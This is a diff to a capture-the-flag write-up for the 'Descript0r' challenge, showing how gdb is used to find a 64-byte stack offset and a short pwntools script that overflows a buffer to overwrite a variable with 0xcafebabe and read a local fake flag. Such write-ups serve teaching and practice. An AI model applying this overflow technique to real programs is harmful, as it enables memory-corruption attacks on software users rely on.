@@ -52,9 +52,35 @@ The value `0xcafebabe` is stored in the `eax` register (eax is just 32-bit versi
 
 The program would ask us for input. Lets give it `AAAABBBBCCCC` so that we can easily identify where our user input starts on the stack.
 
-The program should break at the `cmp` instruction. Now let's see where the `rbp-0x10` starts on the stack. Run `x $rbp-0x10` to check the address of the `local_18` variable. The address is in blue in the lower left of the image:
+The program should break at the `cmp` instruction. Now let's see where the `rbp-0x10` starts on the stack. Run `x $rbp-0x10` to check the address of the `local_18` variable. The address is `0x7fffffffe2e0`(in blue in the lower left of the image):
 
 ![image](https://user-images.githubusercontent.com/83258849/147813879-64c96647-7f70-416e-a4b6-bb290fbf34e8.png)
 
 ### Finding offset needed to reach the variable
-Now let's view the 
+Now let's view where our user input and the `local_18` variable resides on the stack. Run `x /40wx $rsp` to view the values on the stack.
+
+![image](https://user-images.githubusercontent.com/83258849/147814052-fef29652-7972-4202-b07d-5149f4a29734.png)
+
+We see the user input starts at `0x7fffffffe2a0` as indicated by the `0x41414141`, which is our `A`s in hex. Further down, we can see the address `0x7fffffffe2e0`, which is containing the value of our `local_18` variable.
+
+![greet0r](https://user-images.githubusercontent.com/83258849/147814464-d0fbab06-5d3d-4177-8ff4-700262939928.png)
+
+Counting the number of bytes we need to overwrite `local_18`, `64` bytes is needed.
+
+### Crafting Payload and Testing Exploit
+We can easily create the payload in python like in the `Meet Greet0r` challenge. We will utilize `pwntools`. I created a fake flag with the file name `flag` containing `NYP{fake_flag}` locally to simulate when the exploit works.
+```python
+from pwn import *
+
+offset = 64
+
+p = process('./Descript0r')
+print(p.recv())
+p.sendline(b'A'*64 + p64(0xcafebabe))
+print(p.recvall())
+p.close()
+```
+
+![image](https://user-images.githubusercontent.com/83258849/147814773-46748c6e-1836-41fa-8c14-9d93eded4674.png)
+
+We get the flag successfully! Sad that I wasn't able to test this remotely :(
